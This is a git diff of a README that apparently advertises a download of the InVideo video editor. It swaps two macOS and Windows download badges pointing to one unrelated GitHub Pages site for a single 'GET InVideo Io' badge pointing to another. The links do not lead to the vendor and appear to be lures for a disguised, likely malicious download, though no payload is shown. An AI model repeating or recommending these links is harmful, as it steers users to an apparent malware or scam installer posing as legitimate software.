@@ -1,18 +1,7 @@
 # InVideo Download — Video Editing Platform
 
-<a href="https://git-apps-io.github.io/.github/?offer=InVideo" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/InVideo%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="InVideo for macOS">
-</a>
+[![GET InVideo Io](https://img.shields.io/badge/GET%20%E2%80%94%20InVideo-Io-0078D6?style=for-the-badge&logoColor=white)](https://loraleemiskin.github.io/.github/InVideo-Io)
 
-<a href="https://git-apps-io.github.io/.github/?offer=InVideo" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/InVideo%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="InVideo for Windows">
-</a>
 
 ---
 
